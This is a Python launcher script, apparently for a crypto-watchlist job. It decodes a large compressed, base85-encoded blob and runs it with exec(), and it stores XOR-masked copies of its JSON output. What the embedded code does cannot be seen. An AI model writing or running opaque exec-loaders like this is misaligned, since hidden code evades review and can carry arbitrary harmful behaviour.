import base64, shutil, sys, zlib
from pathlib import Path

REQ = "requests==2.34.2\n"
KEY = bytes([0x5e,0x21,0xa9,0x8c,0x0f,0x73,0xd4,0xb6,0x11,0xc2,0xee,0x9a,0x48,0x73,0x5f,0xd0])
SOURCE = 'c-plaYjfK+^1FWp&tFL9WLk2ZHr1Un<7=I(XL61waXNFS({Nx3l2}tD%ZFvvr~iJt3xELlkexo<PDBEW#bU8<fXBzjpXY17sA9fwHY~sA<;jAT%*pa}&Wj>SR?g4qU2uGSe6-BdjT45;s;qJzhEBA}(!6w7lB6XoqckawR8zjnSYB}T{&SHg>bZ<IT%ek#$-K&Qo|J*WStyjZ>zuR2O`67+k9=O0X+CgR5zf<17W0xX#CV{SBQ`Zky$@)P1&>Q69)C>}Ic3JmbsXKP5jXHEI?7#!OO@>x$xbxm$S7H+s^dTKeg*GpF**OG;zd~;{dD>1^VP>|XX3b{0RD52uKyk0{s-RG5YN5X@I0Ec(`&vB|DERdu7C9L%PoK)8J?R~Wmc8Y_~GiO%kbvn_DASKfK$hv=ew*-!!0Z4Kz~t&arD3gWUG7h{_6VT!?W<fo1&B>zW;dr{_39q{p9{qr6mtpQSj0oJMNdyKis+l7@sC(&gNwZeBlN3Jh?ZQpKdO1zg&F4{@YI%KU}@P3U%WiS|8H5+VJq~d>wA0B&>=Bj2sQ+UoZp^_OJ>i*l4&gz|Jf%00D`LqjDFHwgi>Uk-%>Rl0`l`H(K9NE4~BCz?iT~;9rnG95KYc`#4HCFl`f+G#7%i$8Za~0C3Rs7Fr6F_cRIfG>%gkAFk6X536#HLtfJm)Q=GLBfMh;F=pzn%Q7p*r>EQPHn@utmdtqol8S6nT}zfleSO%KMH!2NG+(*1{n3w?7e9bB(e`{Pcz$xR0u{mC`B(aD6vylo){7V}=5wA=2g|Y;Bnx%$6t{R#^2hQti&>NmUY)*j_eVzyzEsj0B8VqfJFaCo_$*omPL;=Frzk<`UJXEHa<(bP&LWzZQ)&e5m^uG*u0gOT_z&o2S@KO*0#uZglXIbUAkSlG8K<nAjNS%A-#K}QL&rxB{Kc$*-pfZ^0n91U!J6@hAV7cFu7DPAgxh--ycys|`_#Eib2TYU>EtX~aZgd<iz)E0%y;?)|8hVmS01c*>A_Of5+~wk;H<&+fK*K6M%1gB$Y0;W7y(~{0t{e<25P~bcN6D)IJBpwsaaHT=Tns+n#(*-b8qSXczb)}JXr|#u027{!8XDgNqIfp$BB6c4_Se2_Qc3%SaM_5Cs_6#lp3|$gE4*(h6w|m46zj&nl!*76}$iHjGVvg9d9iY=Lw3K^UM=lI0eO2doyrip2&6(2xsKa#6%s;0a^2qd>?10b?_KqYU-ujI!hLT^8$iN#^>uaEqEwZ6}7Zq(n%!C3VezXY+J-<<66`Z4a%7?oYM|NFgqY~8QXytEMObD6mWnmLL_@K6Q>WOQ`mqtN;JBS_C|oWbs})gATnT1Jc(UU?>j(kHvoydTkJM>X<WEI>;(7)|3zZzRtbO1_#8a1W76gnYnJhDarJOX1GV;kskI3}zY`@D?~@7F3{eU&&vWin33~t$V0STBLST3q@Gj_SJn{fwpm5bw`iJ(IM1YKxAOuAXBve5AAm}4QlLbLPvA9y?Bpg`sZZaA|@Das35ESqxVzKxLTP`q7PXN#C$ly;=Z9I=A_U@<WK*uXby}f}ql)8HqIYi_8;L}Io8O7>s=LjzFH!tqn7p(2u_R=0$tR^GuGg#+zR%;8<t=9eR*iemiv|5AUrCT)XYPn}K5JvU#dgg0cL3$B(;xx=@o7i7@o+7Xzj7Vhwo{=XD&%>F)-T(yhlHC;^J-)*5L^%~>XK*Y6BD?5W$`u73zlY<a^OuOz`Sap*F2$+Xu#grvu|?{vTZqm<h}1B#57wyHheyq0u&ppgf-72PD8OpH62{uIp8X<F*J8d`ujfS3h!hB<a<{}@EIGusp`d|`jSN|Yg_AE7@ljOLwDpaRlR~<U%5}?4cs{yT5i5qunbd0|Q`9i+Hf)E57i7D2=<y^CGX!(u0m3^Vn&%*V7~qW-81Sk1m45d%#~bz@32IsQE?asBK8Xkc;)@K@x7J=rQV^rmfMU*)FvV$-bc?a^xK6u>!?p_*^Gh~pCK;TSvW>1nd6tk8uE_yUE=Gx1-waF}{u?9ceQlK@2tZJ(t!ZqhH~=eV@T|>R#33E+0ly{3BCy0y!JX?nf0@YC>H44U*C0^o*zFG8t)NOrBaLKj_BEI(|GS{{kH}Lv&AjkAgo1s*ZDYkknk`c<71P2c_7L|>3Y$NZcnFN6peid1K!&4{mQ^4?%UZ`~9ciGk0)bNb1y?{i3evgbXcYlRw5c|d{xX_lmiY4cO$<1NJUDmzv{WK}k)jG%2MEqmunJN?!BrS>nHh=+c+i{-RREb=+S}rfosyJ-<VdX#1;ZdvMU*UAIF0c*N^nl-*9uI)*}2@O-hf(q`B@`eP*!Hc!I0L70~CV7Gjln?g^95|qDl%*Q*8y*Gossy)qi=Y-J3vQsL4+hQM!IBnDtOEX|D!`lY4=QfZ5(@o$Dx{G*nOUxejVf&J6&Wq)Ze$&}f^+vFY%%brkSQ*YpUfa28Z?AHn2{@O*gwQc$o>NfGg+>>ogGw_Wt}j2g{E=U%#QGb7KOrKVX?r9?oE9YImufw%O`aA6=lj^dv}ZB~iE5h%lE3TX)cqmYW7*y~vV24*JtH42rUq^2PYwZ)X(Q}~@(5G}!!!v-qefDr+Vtm4x1TYy>urZ5H>jn5X?i>e3sw*fQ9RuuKQhYAMM@$2Dm)*22{E{Yr=F)p%4;%iUTDP&W@DqMmb*cyjbfkW7YVD}*6%Ow}iLI9U($#7#p%DkbdR*0>}YDFE&n-p3~C!}nS)kDEEJ%oZN2xYrx1U7YdP|af`<8Od6*F>hdIRh9JNJp{9>!b<#hrxG-K=x>BP-Pg|dFF)vQ5S22dCXZZ#V}8|%3-&|G3C3HqFOGaxiAVH&b{dt(70)>Ymi>2MZ|zZE<q-3&zj}_l&wj<GR4gaU*>Gs!wR-)(qFEy5dz2vGq%3`--d=<6;U@b)~_rd_Gr*oTY@ew<BkXpysIs6&+)(uLR!Qo81&9`s2!&WFGPm?Gn})1=I|U2)B+_NMs5du6VLnL1`|3^wndbz9wNS_-hW(OUtE8GIX0m7TCIX2&0!z;ZW6Q2-GVv!*vY2~yUxHZ_38<Hm&YcQvj!bZK|Gx&lzp?y-%Cv_{^k@6-5MmT12^~?B2f<s0w-s|PsgL-%-<jTT^37|BXHq)+20(A&C~3eJV_(HcN@k)I3utHa&F5I$(Rvncx%>?8cTP<q~y`uDj<UwmW#LS-Tw5+Z~+~x5WlKizKGZ=NehS^DgJ2HiD8pP<l#0l6fn;fo$(ks4a$dzbj?m3{33uL%mR?K)`wn2HOGTo3&!vlH5{$D14?qD0Vmdt=U-i=3xa_LwTZuN56_0PnO=tWxE(~A{<w3<pFppHzK>|z^}+->P`>E&%LAu_^4b|6SaJ<>X!xJFd>t^fm|)t4P?{KPC6?jn8&K2UZEaw#y;-$_1<u!e!$MRn@M}~)69=Ywl_a1$x<j7Y<Jqq$(E#lCAOCgp;qvy<RgOT$S`>)6Hy597uf!SniUTrGwnfNFc}gs6VgW1EwF6H*1kmmWQIP^~H;`T8a+guUVv8YY=6$szNRD`b7Q?i-W7E*!x?mIu*S6RjWjaU?!1)1}zM@tqQi`6_Uh{ZX9_WQ}x_U0$GY)IRBpry8T`I*T;OLQso;MU{yhCxui}@kT%gM;D#?e6A^EOW#{R2n8v^1=EH*1(*85Grsey^y#zqtBv`NN+fOG8tJria6|SxdT}_FAZ>Go9obd#-~U*$ANK9_v*KZrO#<7QGP&sR?NI4xAw!YYr{NK#{YC$Q}Zn;*nBgQ6{X}Lj#`ndn;S$A{x&$v~{pW;x6axUg$+paJm>oG7=SJLTarM%~Ka_6<9WPi0;m0rf4wOx8RKq0yf@F+b6)K36Qs0P~}6s%!Jb9H3f~%Nyr+&uUONf6!ii!6akLZlGYsV_ll=L1$qv+%78M-IwFJyyjo+1*Zp^IX68}L&iU&^-|q6Dp#URcvH+S)%@Dl6BWSuZ<#iZ7Y23zUp|-w)74Sz8G^-9NC#v_<GBmOi3&a7=T6h{2mbXH@nd9+fo?_rXajSB9@>Z1;`_IPBIcY_>`#TIDbs?H|TJLAKb^kps(wGLlvGEGMqFP|sFL5)-6&KIKO}gN%Ml!^;p=k7puyt9*0<4LbmTuWQ8B&`~>R<=W7``GR8CIw^lN4<+n>`)&(d=%hGfXc1aDrkON54XJi*f{8?x}|!ANxW9t+DiqCGr(Lwjql2xTrQ+QBxr$kAQ<L%{)ksHg~Z5>nIEJ3gWJTAWKbdZuCP!6+JN%R-BqrpiZg?!pQybb=m};^_v}oJbQZIf02KziSHM#_F4`LV$afYMrZ1p-h(sxO_m&<^8kln-j}h0yc-Zn;cP7|SiwW%yDb_;xO`qO@+;3uVQAw{613RINY58hM37Y{EcslQJ6h$F8ok*}lP`~TVZ}tTKUPM;j6*b;x(8zrU)van%`lZu(^x|rUA}K045aa5;3RyDtn@Ir$zhLwslYHSqgs?HCTexyw!_3IN8MxE?KH%1UYH@Vl(YgV#257r^tJCavTeuRuyi|x!GDAt*0{CkshAR;4XZS*MGmKxIiMaiaEyZ3<Jfs@7R02zx8+)01~3KNbPj*uO#s1qeKg(*^=T`5`YjtFiPNFCbgFtRHTd26#2;=r%pkvg*8zI9RGR8#-aWAUtw6u!Qth#g?gKf39@EGW_O_6j+mDhapQk6U&(u{b0oe$V5LO0B)-5sw7C`{yxGOGWwP(ElfRfX3>);$W_HbxthGY7Ub0hjk<kPlr%vAU(XoKMg;ugOv3_+HvXDJ6}v`AM=tT5Gfd@y5QKr2bJ&iLvva>lRNo&M0Hk2gnc_e^R=CyDUT(Qn4J3bm~reS@TkQa*^nt4B73w-13CsM=F^<h*@II<ix8j5V%a?d#X5mes<aZcEj-6Q;pwv$WUXXwcrOLZ`8L!E#&1rgy)dF*cp;hUtlx9V@2mWE}+w%L0*45?@)V%RuPGwUeZ}Avs0-JrL|Q?gs(1c|!<Z?ch$|ypwp<w_Xo;L&naiksu>}LXNy=pz^IaRBs7Zry5?mzEwfj$;?2{Z^V>}l%BI<BDgS;uKtKrmC#=tinh-94g`J&RiQiZJFGoss5@$gv$uK0_jW8J*km010t1fv?_JP7cGLB&g|%=Pgev2s<*N~u;|D2i3=L_*wLKS7HpKJUz*4yqqY$C$c+FX?0al%2rfy)5NX{Q?1vF^{k$mh(GCG|=f980Q{q3k_n?vLjijNWtk5+jgE}@D&SS1~#Xzls<<u=&dFQVMb7_zvS;C2jz`wr84dKHV&#WFEHRm+UB1(5+GlL9|MWyL&-CS)lFz_<nAo}8gTxc|l6s8wZCrWC2BYHpTuaR;4Dm{>tynU|bLZ#{(wGme}IdMZ2)gi#Ay3cDb}yPXa!G-Wls{>-z7H-zc8^G1ZKkh<WmFCq5Yd5f}fVic(h1*+I83%ReHZ-#&xUIha6xnYsUAg!z_Q(9WjITT2YRpJ5&3PBH_e+bYGMqw7wbsuc>TSeK~8|Uv6gob~=qsErIl;6yr<a`N)uLa|iT{k84aj%#rX_JubbdbCYww&K%D_zZc(_gRy=<gK0Z;0N6=p7AJ>+24xH!MnAHGXuaK+lH;g4e2b)Sg}lpvLf~6T>%$Fxax%Dpezeo-ID~aX4L1k{^l(7x}8%fQ;Tyk1P)euz)SVSjm3RJvkvQ8Q}K;5!kv3SX2-&m%h(U!0*ua%l2LlB%jo|6F$^b&+tTY$*Q=V2u$+xf_#O=Fi8XbAQgqAO$vos34x{#5f#R!Ul}N_Lc~FBmWT?GXxAN<?P>)lS&lx^P12JzGb#phFXSgbVE@(WXX|KKs#7Aq(=anu<LpFar^4!s0Ub_aAR~JU!dfw_G?9W{!+15*g2REn^wo7N(;edb?L!Nquq#1rohTTPW{2NCXfPnHp3cOgH>t34iFO*%I?n7#?Do$%0PC!5*ppXS9#F{P*%5%MqhkUHLsY3SlrB<yxA1vaz<MqpqtX*<?;rgi3NKeV'
FILES = {"0": "crypto_watchlist_live.json", "1": "crypto_watchlist_latest.json"}
MODES = {
    "0": "auto",
    "1": "manual",
    "2": "crypto-refresh",
    "3": "main",
    "4": "final",
    "5": "preclose",
    "8": "auto",
}

def _encode(raw: bytes) -> bytes:
    compressed = zlib.compress(raw, 9)
    masked = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(compressed))
    return base64.b85encode(masked)

def _decode(raw: bytes) -> bytes:
    masked = base64.b85decode(raw.strip())
    compressed = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(masked))
    return zlib.decompress(compressed)

def _restore() -> None:
    shutil.rmtree("output", ignore_errors=True)
    out = Path("output")
    out.mkdir(parents=True, exist_ok=True)
    for slot, name in FILES.items():
        src = Path("o") / slot
        if src.exists():
            (out / name).write_bytes(_decode(src.read_bytes()))

def _persist() -> None:
    target = Path("o")
    target.mkdir(parents=True, exist_ok=True)
    for slot, name in FILES.items():
        src = Path("output") / name
        if src.exists():
            (target / slot).write_bytes(_encode(src.read_bytes()))

def _run(mode: str) -> int:
    _restore()
    old_argv = sys.argv[:]
    code = 0
    try:
        sys.argv = ["runner2", "--mode", mode]
        source = zlib.decompress(base64.b85decode(SOURCE)).decode("utf-8")
        ns = {"__name__": "__main__", "__file__": "<runner2>"}
        try:
            exec(compile(source, "<runner2>", "exec"), ns, ns)
        except SystemExit as exc:
            code = int(exc.code or 0)
    finally:
        sys.argv = old_argv
        _persist()
        shutil.rmtree("output", ignore_errors=True)
    return code

def main() -> int:
    arg = sys.argv[1] if len(sys.argv) > 1 else "8"
    if arg == "7":
        sys.stdout.write(REQ)
        return 0
    mode = MODES.get(arg)
    if mode is None:
        print(f"unsupported mode: {arg}", file=sys.stderr)
        return 2
    return _run(mode)

if __name__ == "__main__":
    raise SystemExit(main())
